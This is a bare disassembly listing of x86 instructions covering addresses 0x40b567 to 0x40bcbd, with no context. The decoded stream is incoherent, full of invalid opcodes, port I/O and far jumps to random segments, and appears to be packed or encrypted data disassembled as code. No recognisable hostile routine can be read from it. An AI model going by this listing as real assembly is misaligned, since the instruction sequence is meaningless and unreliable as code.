  40b567:	mov    al,ds:0xbbcb9dd6
  40b56c:	inc    edx
  40b56d:	xor    ebp,ebx
  40b56f:	pop    eax
  40b570:	jne    0x40b524
  40b572:	sbb    DWORD PTR [edx-0x4bc8c8c5],0x7c
  40b579:	jno    0x40b50c
  40b57b:	out    dx,eax
  40b57c:	stos   DWORD PTR es:[edi],eax
  40b57d:	mov    ch,0x9e
  40b57f:	fisub  WORD PTR [eax+esi*8-0x4e]
  40b583:	or     DWORD PTR [ecx-0x7fc850a7],edi
  40b589:	dec    esp
  40b58a:	jmp    FWORD PTR [ebx]
  40b58c:	arpl   ax,di
  40b58e:	jb     0x40b546
  40b590:	sub    bh,dh
  40b592:	fisttp QWORD PTR [edi]
  40b594:	mov    ebx,0xbf643d8f
  40b599:	sbb    eax,0xbbf21d51
  40b59e:	out    dx,eax
  40b59f:	xchg   BYTE PTR [edx],bl
  40b5a1:	mov    al,ds:0xf9d8a1d9
  40b5a6:	mov    ah,0xd5
  40b5a8:	mov    DWORD PTR [esi-0x46a7e539],eax
  40b5ae:	sub    edx,ebx
  40b5b0:	inc    ecx
  40b5b1:	int    0x63
  40b5b3:	ins    BYTE PTR es:[edi],dx
  40b5b4:	push   cs
  40b5b5:	or     eax,0x69035e3e
  40b5ba:	scas   eax,DWORD PTR es:[edi]
  40b5bb:	loop   0x40b5c7
  40b5bd:	dec    esi
  40b5be:	xchg   DWORD PTR [ecx+eiz*4-0x6a947de1],ecx
  40b5c5:	lea    esp,[ecx-0x12cf82fb]
  40b5cb:	mov    ebx,0x9ea51df2
  40b5d0:	mov    edx,ds
  40b5d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b5d3:	or     DWORD PTR [ecx],edi
  40b5d5:	cwde   
  40b5d6:	aaa    
  40b5d7:	shl    DWORD PTR [edi-0x3619d87],cl
  40b5dd:	sub    dl,cl
  40b5df:	pop    DWORD PTR [eax-0x6c]
  40b5e2:	in     eax,0x9d
  40b5e4:	xchg   DWORD PTR [edx+0x70],eax
  40b5e7:	sub    edi,DWORD PTR [esi+0x40]
  40b5ea:	out    0x73,al
  40b5ec:	jne    0x40b589
  40b5ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b5ef:	jbe    0x40b5bd
  40b5f1:	xchg   esi,eax
  40b5f3:	dec    eax
  40b5f4:	sbb    eax,0x5f97dd91
  40b5f9:	test   DWORD PTR gs:[eax],esp
  40b5fc:	cli    
  40b5fd:	push   0x60
  40b5ff:	sti    
  40b600:	jle    0x40b633
  40b602:	cld    
  40b603:	nop
  40b604:	montmul (bad)
  40b605:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b606:	xchg   al,al
  40b608:	jecxz  0x40b662
  40b60a:	(bad)  
  40b60b:	pop    ebx
  40b60c:	mov    cl,0xa1
  40b60e:	mov    ecx,0x6425fac1
  40b613:	pusha  
  40b614:	cmc    
  40b615:	sti    
  40b616:	call   0x8456:0x60b6e979
  40b61d:	xchg   ebp,eax
  40b61e:	inc    eax
  40b61f:	icebp  
  40b620:	loopne 0x40b618
  40b622:	dec    esp
  40b623:	scas   al,BYTE PTR es:[edi]
  40b624:	push   es
  40b625:	popa   
  40b626:	mov    WORD PTR [esi+0x678bd4b4],?
  40b62c:	xor    edx,eax
  40b62e:	xchg   esp,eax
  40b62f:	jo     0x40b61c
  40b631:	mov    edi,0xf3db241e
  40b636:	call   0x2cdd1eb1
  40b63b:	fyl2xp1 
  40b63d:	shl    BYTE PTR [ecx+0x5c],1
  40b640:	mov    DWORD PTR [esi],eax
  40b642:	xchg   esp,eax
  40b643:	and    ebp,DWORD PTR [eax+ebp*2+0x16]
  40b647:	jbe    0x40b68d
  40b649:	sbb    ch,BYTE PTR [esi+0x3987e4d]
  40b64f:	fs test al,0xe0
  40b652:	shr    dl,cl
  40b654:	mov    ds:0xb8976b7c,al
  40b659:	and    ah,dl
  40b65b:	scas   eax,DWORD PTR es:[edi]
  40b65c:	(bad)  
  40b65d:	adc    DWORD PTR [ecx],edx
  40b65f:	mov    DWORD PTR [ecx+0x32725e03],ebp
  40b665:	pop    eax
  40b666:	push   ecx
  40b667:	retf   0x1b48
  40b66a:	cmc    
  40b66b:	repnz cli 
  40b66d:	mov    bh,0x51
  40b66f:	cdq    
  40b670:	pusha  
  40b671:	int3   
  40b672:	ins    BYTE PTR es:[edi],dx
  40b673:	jbe    0x40b6ee
  40b675:	popa   
  40b676:	popf   
  40b677:	mov    edx,0xfcfcde85
  40b67c:	ret    0x973a
  40b67f:	(bad)  
  40b680:	cmc    
  40b681:	jle    0x40b667
  40b683:	and    eax,0x6d65c53f
  40b688:	dec    edx
  40b689:	sub    al,dh
  40b68b:	and    DWORD PTR ss:[edx-0x33],ecx
  40b68f:	fs aad 0xcc
  40b692:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b693:	imul   cx,WORD PTR [edi+0x1a],0x6f1
  40b699:	les    eax,FWORD PTR [ebp-0x69]
  40b69c:	hlt    
  40b69d:	jp     0x40b6ee
  40b69f:	jnp    0x40b63c
  40b6a1:	jae    0x40b627
  40b6a3:	or     DWORD PTR [eax-0x4e],esi
  40b6a6:	rol    BYTE PTR [edx+0x40],cl
  40b6a9:	mov    dl,BYTE PTR [ecx+0x9]
  40b6ac:	jg     0x40b65c
  40b6ae:	rol    DWORD PTR [ecx],cl
  40b6b0:	mov    cl,0x62
  40b6b2:	(bad)  
  40b6b3:	stos   DWORD PTR es:[edi],eax
  40b6b4:	cmp    eax,0xe8cc11e6
  40b6b9:	mov    ah,0x15
  40b6bb:	mov    ebx,0x89e9ca2f
  40b6c0:	xor    DWORD PTR [ecx+0x2919ff8e],ecx
  40b6c6:	inc    edx
  40b6c7:	push   edx
  40b6c8:	outs   dx,BYTE PTR ds:[esi]
  40b6c9:	lds    eax,FWORD PTR [ecx+0x5a]
  40b6cc:	push   0x6a
  40b6ce:	mov    dl,0xc8
  40b6d0:	push   ds
  40b6d1:	cwde   
  40b6d2:	xor    bh,ch
  40b6d4:	daa    
  40b6d5:	lea    ebx,cs:[ecx+0x23]
  40b6d9:	jbe    0x40b71d
  40b6db:	call   0xc692:0x75d2f20b
  40b6e2:	pop    es
  40b6e3:	cwde   
  40b6e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b6e5:	jo     0x40b736
  40b6e7:	out    dx,eax
  40b6e8:	pop    ecx
  40b6e9:	lock mov edi,0xb563cf2e
  40b6ef:	cmp    BYTE PTR [edx-0x25],0xa
  40b6f3:	adc    al,0x1c
  40b6f5:	ret    
  40b6f6:	(bad)  
  40b6fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b6fb:	std    
  40b6fc:	and    esi,0xc0ab261b
  40b702:	xor    ebx,DWORD PTR [eax]
  40b704:	dec    esp
  40b705:	mov    ds:0x7b8d3fe4,al
  40b70a:	call   0x789e:0xaf90aaf9
  40b711:	add    al,0xea
  40b713:	mov    ah,al
  40b715:	pop    edx
  40b716:	push   ebx
  40b717:	shl    dl,cl
  40b719:	push   es
  40b71a:	mov    ah,0x2
  40b71c:	aaa    
  40b71d:	push   0xf4b632f2
  40b722:	mov    ebx,0xbf0242ab
  40b727:	stos   DWORD PTR es:[edi],eax
  40b728:	out    dx,eax
  40b729:	dec    eax
  40b72a:	jae    0x40b6d6
  40b72c:	aas    
  40b72d:	mov    ebp,0x68b6eaaa
  40b732:	cwde   
  40b733:	pop    edx
  40b734:	mov    bh,0x6b
  40b736:	int3   
  40b737:	and    dh,al
  40b739:	mov    eax,0x110887dd
  40b73e:	sbb    BYTE PTR [eax],0xe3
  40b741:	and    eax,0xcedcbe5e
  40b746:	scas   al,BYTE PTR es:[edi]
  40b747:	sub    eax,0x711a0c4a
  40b74c:	jecxz  0x40b73d
  40b74e:	jno    0x40b709
  40b750:	adc    ebp,DWORD PTR [eax-0x59]
  40b753:	mov    dh,0x27
  40b755:	mov    eax,ds:0xfd12484f
  40b75a:	xor    BYTE PTR [ebx+0x7],0x37
  40b75e:	gs cs push cs
  40b761:	sub    ch,0x2e
  40b764:	lods   eax,DWORD PTR ds:[esi]
  40b765:	jbe    0x40b6fb
  40b767:	sti    
  40b768:	add    ecx,esi
  40b76a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b76b:	pop    ecx
  40b76c:	bound  edi,QWORD PTR [ebp+0x22]
  40b76f:	jb     0x40b7d2
  40b771:	dec    esp
  40b772:	xor    DWORD PTR [eax+0xe],ebp
  40b775:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b776:	mov    edx,0xbcb1072e
  40b77b:	icebp  
  40b77c:	leave  
  40b77d:	call   0x4e10f269
  40b782:	ins    BYTE PTR es:[edi],dx
  40b783:	fisubr WORD PTR [ebx-0x21]
  40b786:	pop    edx
  40b787:	mov    ebx,0xc9d45c7
  40b78c:	je     0x40b7d5
  40b78e:	imul   esi,DWORD PTR [ebx+ecx*8+0x47],0xab3ede93
  40b796:	retf   
  40b797:	(bad)  
  40b798:	pop    edx
  40b799:	xchg   edi,eax
  40b79a:	push   edx
  40b79b:	dec    ecx
  40b79c:	jg     0x40b7c5
  40b79e:	shl    DWORD PTR [ebp-0x648d2f44],1
  40b7a4:	fwait
  40b7a5:	loope  0x40b76b
  40b7a7:	add    BYTE PTR [ecx-0x685658b8],dl
  40b7ad:	xchg   esi,eax
  40b7ae:	fsubrp st(6),st
  40b7b0:	mov    BYTE PTR [eax],0xb8
  40b7b3:	mov    esp,0xc64baa95
  40b7b8:	adc    DWORD PTR [ebp+0x3e38f3cc],0xffffffdc
  40b7bf:	jmp    0x246d:0xe90728d4
  40b7c6:	ficom  DWORD PTR [eax+0x23]
  40b7c9:	inc    edi
  40b7ca:	add    BYTE PTR [ecx],dl
  40b7cc:	pusha  
  40b7cd:	pop    es
  40b7ce:	xchg   ecx,eax
  40b7cf:	mov    dh,al
  40b7d1:	(bad)  
  40b7d2:	jmp    0x466c1249
  40b7d7:	mov    ds:0xc59741b6,al
  40b7dc:	push   0x2380cd5e
  40b7e1:	cmp    al,0xa7
  40b7e3:	sbb    al,0xf0
  40b7e5:	outs   dx,BYTE PTR es:[esi]
  40b7e7:	shl    DWORD PTR [eax+0x166de896],1
  40b7ed:	pop    esi
  40b7ee:	jp     0x40b83c
  40b7f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b7f1:	dec    edx
  40b7f2:	and    bh,0xe7
  40b7f5:	in     al,0xd9
  40b7f7:	add    BYTE PTR [esi],ah
  40b7f9:	cdq    
  40b7fa:	les    esi,FWORD PTR [edi-0x77]
  40b7fd:	mov    dl,0x33
  40b7ff:	(bad)  
  40b800:	ds pop es
  40b802:	ror    DWORD PTR [eax+0x6d],0x19
  40b806:	xor    al,0x4b
  40b808:	push   0xfcd0994
  40b80d:	jle    0x40b7c6
  40b80f:	jmp    0x3ff8939e
  40b814:	cmc    
  40b815:	lods   al,BYTE PTR ds:[esi]
  40b816:	leave  
  40b817:	inc    ebp
  40b818:	fld    QWORD PTR ds:0x7e38b5e0
  40b81e:	push   esp
  40b81f:	jae    0x40b893
  40b821:	xchg   esp,eax
  40b822:	mov    ebp,0xb2c8823d
  40b827:	outs   dx,DWORD PTR fs:[esi]
  40b829:	or     bh,cl
  40b82b:	retf   
  40b82c:	push   eax
  40b82d:	pop    eax
  40b82e:	cmp    ebp,esp
  40b830:	imul   ecx,DWORD PTR [edi-0x26],0x7a454e96
  40b837:	jge    0x40b888
  40b839:	and    eax,0xb6863c59
  40b83e:	in     eax,0xed
  40b840:	push   ebp
  40b841:	inc    eax
  40b842:	xchg   esp,eax
  40b843:	stos   DWORD PTR es:[edi],eax
  40b844:	xlat   BYTE PTR ds:[ebx]
  40b845:	jo     0x40b882
  40b847:	rol    BYTE PTR [ebp+0x27],1
  40b84a:	out    0x71,eax
  40b84c:	ins    BYTE PTR es:[edi],dx
  40b84d:	fcom   DWORD PTR [eax+0x51]
  40b850:	sahf   
  40b851:	retf   0xe74
  40b854:	xor    BYTE PTR [edi-0x6cf6fdf9],al
  40b85a:	fiadd  WORD PTR [edx+0x15]
  40b85d:	cmc    
  40b85e:	xlat   BYTE PTR ds:[ebx]
  40b85f:	push   edi
  40b860:	cmp    BYTE PTR [edi],0xe0
  40b863:	idiv   BYTE PTR [edi+0x48abd298]
  40b869:	jge    0x40b8af
  40b86b:	dec    esp
  40b86c:	pop    esp
  40b86d:	sub    eax,0xf6261395
  40b872:	ins    BYTE PTR es:[edi],dx
  40b873:	sbb    eax,0xb8223a6c
  40b878:	test   DWORD PTR [ebp-0x3e1caf5c],edi
  40b87e:	retf   0x32e1
  40b881:	inc    ecx
  40b882:	(bad)  
  40b883:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b884:	and    cl,BYTE PTR [edx+0x6cd251f9]
  40b88a:	xchg   DWORD PTR [eax],edx
  40b88c:	and    al,0x39
  40b88e:	jo     0x40b8e9
  40b890:	sbb    eax,0x7118eebf
  40b895:	pop    esi
  40b896:	xchg   BYTE PTR [esi-0x67],ah
  40b899:	loop   0x40b8aa
  40b89b:	cmp    DWORD PTR [ecx+0x15d53d9],ebx
  40b8a1:	leave  
  40b8a2:	lahf   
  40b8a3:	cmp    cl,bh
  40b8a5:	in     eax,dx
  40b8a6:	add    DWORD PTR [ebx*1+0x43388027],ebx
  40b8ad:	adc    bh,cl
  40b8af:	push   es
  40b8b0:	ja     0x40b85c
  40b8b2:	xor    al,0x72
  40b8b4:	mov    ds:0x6853be93,eax
  40b8b9:	lock mov cs,WORD PTR [ecx]
  40b8bc:	pop    esp
  40b8bd:	icebp  
  40b8be:	jnp    0x40b849
  40b8c0:	adc    dh,cl
  40b8c2:	sub    DWORD PTR [ebp-0xa],edx
  40b8c5:	fs cmp eax,0x38e43d22
  40b8cb:	scas   eax,DWORD PTR es:[edi]
  40b8cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b8cd:	ret    
  40b8ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b8cf:	fsub   QWORD PTR [eax-0x61a6a62f]
  40b8d5:	mov    esi,0x12c5e775
  40b8da:	jnp    0x40b911
  40b8dc:	push   ebx
  40b8dd:	sub    eax,0x9f4e17f2
  40b8e2:	adc    DWORD PTR [edi-0x38bf0093],ebx
  40b8e8:	mov    eax,ds:0x49dcf4a5
  40b8ed:	mov    ecx,0x1b793e1c
  40b8f2:	retf   
  40b8f3:	push   ds
  40b8f4:	sbb    cl,al
  40b8f6:	es adc eax,0x19d2503
  40b8fc:	mov    bl,0x0
  40b8fe:	inc    edx
  40b8ff:	sub    esp,DWORD PTR [esi+0x52fbacfc]
  40b905:	cli    
  40b906:	pusha  
  40b907:	pop    edi
  40b908:	pop    edx
  40b909:	cld    
  40b90a:	fcomi  st,st(0)
  40b90c:	inc    esi
  40b90d:	pop    es
  40b90e:	push   ds
  40b90f:	lods   al,BYTE PTR ds:[esi]
  40b910:	int    0xb3
  40b912:	data16 (bad) 
  40b915:	xlat   BYTE PTR ds:[ebx]
  40b916:	es jno 0x40b95b
  40b919:	les    ecx,FWORD PTR [ebp+0x4912126b]
  40b91f:	add    DWORD PTR [esi],ebx
  40b921:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b922:	mov    ch,0x63
  40b924:	cmp    eax,DWORD PTR [ecx+0x400e509e]
  40b92a:	jo     0x40b90a
  40b92c:	lds    ebp,FWORD PTR [edx-0x8]
  40b92f:	mov    ecx,DWORD PTR [ecx]
  40b931:	mov    bh,0x57
  40b933:	add    al,0x70
  40b935:	dec    ecx
  40b936:	jne    0x40b8bf
  40b938:	xchg   edx,eax
  40b939:	outs   dx,BYTE PTR ds:[esi]
  40b93a:	inc    ebp
  40b93b:	test   DWORD PTR [edx+0x44],ebp
  40b93e:	xor    BYTE PTR [edi+0x16c39a3c],dh
  40b944:	mov    DWORD PTR [eax-0x4c],edx
  40b947:	pop    ebp
  40b948:	pushf  
  40b949:	pop    es
  40b94a:	int    0x4
  40b94c:	and    dh,0x46
  40b94f:	jne    0x40b984
  40b951:	in     al,0xa8
  40b953:	mov    esi,DWORD PTR [esi-0x57135fa]
  40b959:	mov    ch,0xf6
  40b95b:	jns    0x40b8fc
  40b95d:	mul    DWORD PTR [ebx+0x37]
  40b960:	and    dl,cl
  40b962:	imul   ebx,ebp,0xfffffff9
  40b965:	in     eax,0xb8
  40b967:	fdivr  QWORD PTR [ecx*1-0x368013d5]
  40b96e:	adc    esp,DWORD PTR [ebp+0x44036ccc]
  40b974:	dec    edi
  40b975:	loope  0x40b99e
  40b977:	loope  0x40b9c6
  40b979:	fisttp QWORD PTR ss:[ebx]
  40b97c:	inc    ebx
  40b97d:	aad    0x53
  40b97f:	fstp   DWORD PTR [edx]
  40b981:	test   eax,0x1d69d4c9
  40b986:	pop    ecx
  40b987:	push   ebx
  40b988:	inc    eax
  40b989:	arpl   WORD PTR [ebx],sp
  40b98b:	add    edi,ecx
  40b98d:	(bad)  
  40b98e:	fsub   QWORD PTR [ebp-0x32]
  40b991:	xchg   edi,eax
  40b992:	ja     0x40b99c
  40b994:	das    
  40b995:	jb     0x40b97e
  40b997:	call   0x9c520b13
  40b99c:	mov    eax,ds:0x58cfe922
  40b9a1:	dec    ecx
  40b9a2:	mov    ebp,DWORD PTR [ebx]
  40b9a4:	mov    dh,ah
  40b9a6:	or     al,BYTE PTR [eax+0x77cbfc43]
  40b9ac:	add    dh,BYTE PTR [esi-0x71]
  40b9af:	sti    
  40b9b0:	je     0x40b9ca
  40b9b2:	dec    edx
  40b9b3:	xor    ch,BYTE PTR [esi-0x37]
  40b9b6:	lods   al,BYTE PTR ds:[esi]
  40b9b7:	inc    ecx
  40b9b8:	push   esp
  40b9b9:	int    0x5f
  40b9bb:	hlt    
  40b9bc:	and    dh,bl
  40b9be:	pop    ecx
  40b9bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b9c0:	pop    eax
  40b9c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9c2:	leave  
  40b9c3:	fldenv [ebx-0x5f7219ee]
  40b9c9:	jge    0x40b94d
  40b9cb:	mul    DWORD PTR [eax-0x109795be]
  40b9d1:	fbld   TBYTE PTR [ecx]
  40b9d3:	into   
  40b9d4:	adc    BYTE PTR [ebp+ecx*2-0x7f],al
  40b9d8:	in     al,0x0
  40b9da:	out    0x99,eax
  40b9dc:	or     ah,BYTE PTR [edx-0x74]
  40b9df:	aad    0x58
  40b9e1:	hlt    
  40b9e2:	loope  0x40b9a3
  40b9e4:	jg     0x40b975
  40b9e6:	loop   0x40ba25
  40b9e8:	imul   esp,esi,0xec3a6f61
  40b9ee:	mov    bl,0xc
  40b9f0:	push   edx
  40b9f1:	ror    ecx,cl
  40b9f3:	push   ds
  40b9f4:	xlat   BYTE PTR ds:[ebx]
  40b9f6:	xchg   bh,bl
  40b9f8:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b9fa:	cld    
  40b9fb:	mov    eax,DWORD PTR [edx-0x5b]
  40b9fe:	pushf  
  40b9ff:	ss jecxz 0x40b9d2
  40ba02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba03:	retf   0x8cbd
  40ba06:	test   al,0x43
  40ba08:	(bad)  
  40ba0a:	mov    edi,0xa70cd633
  40ba0f:	leave  
  40ba10:	fimul  WORD PTR [ebx+0x4d711e99]
  40ba16:	retf   
  40ba17:	cmp    al,0xe9
  40ba19:	and    eax,0xcb8f2890
  40ba1e:	add    cl,al
  40ba20:	push   esi
  40ba21:	rcr    DWORD PTR [esi+0xd],cl
  40ba24:	out    dx,al
  40ba25:	adc    ebx,esp
  40ba27:	mov    ebp,0xea365930
  40ba2c:	xor    eax,0x68ce9ed
  40ba31:	js     0x40ba1b
  40ba33:	mov    eax,0x5f03b4bc
  40ba38:	jae    0x40b9d0
  40ba3a:	mov    al,ds:0x13d6eb1d
  40ba3f:	mov    ecx,0x10503394
  40ba44:	fimul  DWORD PTR [ecx+ebp*1+0x6b6589bc]
  40ba4b:	cmp    esi,ebp
  40ba4d:	jne    0x40bac6
  40ba4f:	inc    esi
  40ba50:	retf   0x2710
  40ba53:	data16 fld st(5)
  40ba56:	popf   
  40ba57:	mov    ah,0xc2
  40ba59:	aam    0xd0
  40ba5b:	jmp    0x40ba1d
  40ba5d:	pop    edx
  40ba5e:	xlat   BYTE PTR ds:[ebx]
  40ba5f:	aaa    
  40ba60:	and    dh,BYTE PTR [ebp-0x3b1e01e4]
  40ba66:	fs ss mov eax,0x8344351
  40ba6d:	test   DWORD PTR [eax],ebp
  40ba6f:	jo     0x40ba10
  40ba71:	push   ss
  40ba72:	sub    eax,0xdbf841ce
  40ba77:	dec    edx
  40ba78:	sbb    ecx,DWORD PTR [ebp+0x0]
  40ba7b:	cmp    BYTE PTR [ecx],0x32
  40ba7e:	adc    DWORD PTR [edi-0x4311e656],esp
  40ba84:	pushf  
  40ba85:	jbe    0x40ba9a
  40ba87:	popf   
  40ba88:	inc    esi
  40ba89:	mov    ds:0xfc88915a,eax
  40ba8e:	popa   
  40ba8f:	in     eax,dx
  40ba90:	push   ds
  40ba91:	sub    eax,0xa8c2d296
  40ba96:	lea    esi,[eax-0x47f00391]
  40ba9c:	imul   esp,DWORD PTR [edi],0x32
  40ba9f:	add    al,0xcb
  40baa1:	or     DWORD PTR [edx+0x18],esp
  40baa4:	or     DWORD PTR [edi-0x32],0x537f85d3
  40baab:	mov    eax,0x510c1627
  40bab0:	jns    0x40bb2a
  40bab2:	ss xor eax,ecx
  40bab5:	jmp    0xb94c:0x3522c9ed
  40babc:	sbb    dl,BYTE PTR [edi+0x7f]
  40babf:	jp     0x40bb2b
  40bac1:	mov    WORD PTR [ecx+0x1e5b7ead],?
  40bac7:	fcomp  QWORD PTR [ebx]
  40bac9:	push   ebp
  40baca:	in     eax,dx
  40bacb:	xchg   BYTE PTR [edi+0x34],dl
  40bace:	sbb    al,0x37
  40bad0:	add    BYTE PTR [ecx-0xa550290],dh
  40bad6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bad7:	adc    bl,BYTE PTR [ebp+0x783557fd]
  40badd:	mov    ebx,0xc12fb938
  40bae2:	cmp    cl,BYTE PTR [ecx+ebp*1-0x7bb9cb0]
  40bae9:	jg     0x40bb07
  40baeb:	in     eax,dx
  40baec:	push   edi
  40baed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40baee:	aas    
  40baef:	or     DWORD PTR [edi+0x496ed3e1],edi
  40baf5:	jns    0x40bac4
  40baf7:	fist   WORD PTR [edi+0x6b]
  40bafa:	mov    edx,0xf66556f8
  40baff:	(bad)  
  40bb00:	fsub   DWORD PTR [edx]
  40bb02:	mov    esi,0x99e835d3
  40bb07:	lds    esp,FWORD PTR [edx-0x58f44ca5]
  40bb0d:	and    DWORD PTR [esi-0x2e],esp
  40bb10:	jno    0x40bb70
  40bb12:	test   eax,0xfaf037f5
  40bb17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb18:	and    al,0x53
  40bb1a:	mov    ebx,0x296e4369
  40bb1f:	jge    0x40babe
  40bb21:	out    dx,al
  40bb22:	lods   al,BYTE PTR ds:[esi]
  40bb23:	and    DWORD PTR [esi],esp
  40bb25:	test   cl,ch
  40bb27:	aas    
  40bb28:	dec    esi
  40bb29:	and    DWORD PTR [ebx+0x1e],esi
  40bb2c:	mov    esp,DWORD PTR [edi-0x79]
  40bb2f:	cld    
  40bb30:	add    BYTE PTR [ebx],al
  40bb32:	xchg   edx,eax
  40bb33:	mov    dh,0xbd
  40bb35:	mov    BYTE PTR [ebx+0x68],dh
  40bb38:	cmc    
  40bb39:	or     BYTE PTR [eax-0x2c93014b],dh
  40bb3f:	push   edx
  40bb40:	rcl    BYTE PTR [ebx],1
  40bb42:	sbb    eax,0xf61f4129
  40bb47:	cmp    eax,0x7b6a2591
  40bb4c:	out    0xde,al
  40bb4e:	xor    al,0xe2
  40bb50:	mov    ebp,DWORD PTR [ebp-0x5cddd181]
  40bb56:	hlt    
  40bb57:	test   eax,0xc501fdbb
  40bb5c:	mov    al,ds:0x266d3f9b
  40bb61:	cmp    BYTE PTR [edx],bl
  40bb63:	inc    edi
  40bb64:	pushf  
  40bb65:	test   BYTE PTR [ebx],cl
  40bb67:	sbb    DWORD PTR [ecx+eiz*1+0xa],esp
  40bb6b:	fld    QWORD PTR [edx+0x6b0b71e6]
  40bb71:	mov    ebx,0x64859f58
  40bb76:	mov    esi,0xb6b34ccd
  40bb7b:	mov    ?,WORD PTR [ecx+edi*4+0x1c2fb06a]
  40bb82:	gs je  0x40bb29
  40bb85:	loope  0x40bb0d
  40bb87:	push   ecx
  40bb88:	call   DWORD PTR [ebx+0x7]
  40bb8b:	stos   DWORD PTR es:[edi],eax
  40bb8c:	jno    0x40bbe2
  40bb8e:	adc    edx,DWORD PTR [esi+0x5f98dcb7]
  40bb94:	arpl   WORD PTR [eax],ax
  40bb96:	and    BYTE PTR ds:0x72bf957d,dh
  40bb9c:	retf   
  40bb9d:	test   bh,cl
  40bb9f:	cmp    ah,cl
  40bba1:	mov    esp,0xb34f9392
  40bba6:	mov    ebx,0x2425d691
  40bbab:	jae    0x40bbfc
  40bbad:	and    BYTE PTR ds:0x272286aa,cl
  40bbb3:	jp     0x40bb5d
  40bbb5:	in     al,dx
  40bbb6:	adc    esi,ecx
  40bbb8:	(bad)  
  40bbb9:	jae    0x40bc10
  40bbbb:	adc    al,0x23
  40bbbd:	jno    0x40bb4b
  40bbbf:	in     al,dx
  40bbc0:	push   ds
  40bbc1:	mov    dh,0xa
  40bbc3:	das    
  40bbc4:	inc    edi
  40bbc5:	fnsetpm(287 only) 
  40bbc7:	pusha  
  40bbc8:	cmp    al,0xec
  40bbca:	ins    BYTE PTR es:[edi],dx
  40bbcb:	adc    eax,0xc80089e3
  40bbd0:	add    eax,0x831e39ae
  40bbd5:	jmp    ecx
  40bbd7:	mov    al,ds:0x4703e016
  40bbdc:	mov    cl,0x5f
  40bbde:	inc    ebp
  40bbdf:	int    0x7f
  40bbe1:	mov    esp,0x60e36c47
  40bbe6:	jg     0x40bc4b
  40bbe8:	inc    esp
  40bbe9:	push   ecx
  40bbea:	lea    esi,[ebx]
  40bbec:	xchg   BYTE PTR [ebx],bl
  40bbee:	push   eax
  40bbef:	push   0xffffffaf
  40bbf1:	xchg   DWORD PTR [ecx-0x587e66a9],ebx
  40bbf7:	ret    
  40bbf8:	data16 sti 
  40bbfa:	ret    
  40bbfb:	lods   eax,DWORD PTR ds:[esi]
  40bbfc:	adc    esi,esp
  40bbfe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bbff:	sar    BYTE PTR [edx+0x7],0xf6
  40bc03:	ficom  DWORD PTR [ebp-0x3a]
  40bc06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc07:	fmul   QWORD PTR [ebx-0x30]
  40bc0a:	adc    eax,0x76b7361f
  40bc0f:	and    ch,BYTE PTR [edx+0x29853e4d]
  40bc15:	adc    BYTE PTR [esi],ch
  40bc17:	lods   al,BYTE PTR ds:[esi]
  40bc18:	xchg   ecx,eax
  40bc19:	mov    eax,0x5a98fa27
  40bc1e:	cld    
  40bc1f:	dec    edi
  40bc20:	mov    gs,WORD PTR [esi+0x69d8a501]
  40bc26:	xor    al,0xab
  40bc28:	test   BYTE PTR [ebx],dh
  40bc2a:	in     eax,dx
  40bc2b:	call   0x69a069c8
  40bc30:	imul   esp,esi,0xd3f11127
  40bc36:	xor    al,0x22
  40bc38:	std    
  40bc39:	call   0xd06c:0x56582920
  40bc40:	mov    ebx,DWORD PTR [ecx]
  40bc42:	xchg   edi,eax
  40bc43:	mov    eax,0x754a4d3e
  40bc48:	xor    BYTE PTR [ebp+eax*4+0x5c],dh
  40bc4c:	add    DWORD PTR [ecx-0x39f36aea],esi
  40bc52:	ins    DWORD PTR es:[edi],dx
  40bc53:	dec    esp
  40bc54:	xor    edi,ebp
  40bc56:	imul   DWORD PTR [eax-0x1fa55a19]
  40bc5c:	in     al,dx
  40bc5d:	loope  0x40bcb3
  40bc5f:	xor    eax,0x21761418
  40bc64:	mov    ebp,0xe31a1c13
  40bc69:	jnp    0x40bc81
  40bc6b:	adc    eax,0x73240947
  40bc70:	outs   dx,BYTE PTR ds:[esi]
  40bc71:	jb     0x40bc8d
  40bc73:	sub    DWORD PTR [eax+0x6e],eax
  40bc76:	or     dh,BYTE PTR [ebp-0x30]
  40bc79:	sub    DWORD PTR [edi+0x31bde2e6],0xfffffff9
  40bc80:	xor    BYTE PTR [eax+0x195abf5d],ch
  40bc86:	(bad)  
  40bc87:	cmp    DWORD PTR [ecx-0x80],0xbbb73f01
  40bc8e:	pushf  
  40bc8f:	jmp    0xa0f1:0x6a996556
  40bc96:	rol    DWORD PTR [ebx],1
  40bc98:	mov    WORD PTR [ebx],ds
  40bc9a:	xor    bl,BYTE PTR [esp+ecx*2]
  40bc9d:	add    ch,bh
  40bc9f:	int    0x14
  40bca1:	inc    ebx
  40bca2:	mov    bh,0x7a
  40bca4:	xor    al,0xed
  40bca6:	sub    BYTE PTR [edx],al
  40bca8:	fimul  DWORD PTR [edx-0x66]
  40bcab:	scas   al,BYTE PTR es:[edi]
  40bcac:	jmp    0xa51ab486
  40bcb1:	push   edx
  40bcb2:	loopne 0x40bc74
  40bcb4:	std    
  40bcb5:	xchg   ebx,eax
  40bcb6:	jp     0x40bd02
  40bcb8:	mov    dh,0xfa
  40bcba:	test   al,0x97
  40bcbc:	inc    ecx
  40bcbd:	xchg   ebp,eax
